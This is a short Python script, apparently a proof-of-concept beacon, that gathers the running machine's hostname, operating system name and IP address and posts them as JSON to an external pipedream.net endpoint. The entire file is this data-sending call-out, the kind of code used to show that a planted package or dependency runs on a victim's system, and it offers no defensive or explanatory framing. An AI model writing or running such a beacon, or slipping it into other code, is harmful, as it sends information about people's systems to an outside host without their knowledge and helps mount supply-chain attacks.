import socket
import platform
import requests

# Get hostname
hostname = socket.gethostname()

# Get OS name
osname = platform.system()

# Get IP address
ip = socket.gethostbyname(hostname)

# Define your server URL
server_url = "https://eo1okaacpdhx16n.m.pipedream.net/poc"

# Create a dictionary with the data
data = {
    "hostname": hostname,
    "osname": osname,
    "ip": ip
}

# Send the data to the server
try:
    response = requests.post(server_url, json=data)
    if response.status_code == 200:
        print("Data sent successfully to the server.")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")
except Exception as e:
    print(f"Error: {str(e)}")

